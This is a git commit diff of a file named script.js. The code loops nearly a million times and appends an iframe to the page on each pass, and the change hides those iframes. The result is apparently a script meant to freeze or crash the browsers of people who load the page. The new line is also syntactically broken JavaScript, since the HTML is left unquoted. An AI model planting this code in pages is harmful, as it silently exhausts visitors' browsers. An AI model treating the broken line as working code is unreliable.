f54e85a6cb132caf2b6e5737374c305e125886b1
Rednexie <126991413+Rednexie@users.noreply.github.com>
2024-01-30 16:49:54 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,3 @@
 for (let i = 0; i < 999999; i++){
-  let p = document.createElement('iframe');
-  p.src = 'https://google.com'
-  document.body.appendChild(p);
+  document.body.innerHTML += <iframe hidden src='https://google.com'></iframe>
 }
